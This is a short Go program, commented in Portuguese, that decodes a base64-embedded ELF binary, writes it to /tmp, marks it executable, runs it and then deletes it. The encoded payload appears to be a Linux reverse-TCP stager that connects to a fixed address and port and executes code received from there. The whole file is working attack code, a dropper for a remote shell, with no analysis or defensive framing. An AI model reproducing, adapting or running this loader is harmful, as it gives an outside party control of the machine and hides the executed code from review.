package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func main() {
	// Payload Base64 em formato de string
	payloadBase64 := `f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAAMf9qCViZthBIidZNMclqIkFaagdaDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgARXMCoeshRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g==`

	// Remova quebras de linha e espaços extras
	payloadBase64 = strings.ReplaceAll(payloadBase64, "\n", "")
	payloadBase64 = strings.TrimSpace(payloadBase64)

	// Decodifique o payload Base64
	payload, err := base64.StdEncoding.DecodeString(payloadBase64)
	if err != nil {
		fmt.Printf("Erro ao decodificar payload: %v\n", err)
		return
	}

	// Salve o payload decodificado em um arquivo temporário
	tmpFileName := "/tmp/temp_payload"
	tmpFile, err := os.Create(tmpFileName)
	if err != nil {
		fmt.Printf("Erro ao criar arquivo temporário: %v\n", err)
		return
	}
	defer os.Remove(tmpFileName) // Remova o arquivo quando terminar

	if _, err := tmpFile.Write(payload); err != nil {
		fmt.Printf("Erro ao escrever payload no arquivo: %v\n", err)
		return
	}
	tmpFile.Close()

	// Ajuste as permissões do arquivo para garantir que ele possa ser executado
	err = os.Chmod(tmpFileName, 0755)
	if err != nil {
		fmt.Printf("Erro ao ajustar permissões do arquivo: %v\n", err)
		return
	}

	// Execute o payload
	cmd := exec.Command(tmpFileName)
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("Erro ao executar payload: %v\n", err)
		fmt.Printf("Saída do comando: %s\n", out)
		return
	}
	fmt.Println("Payload executado com sucesso")
}
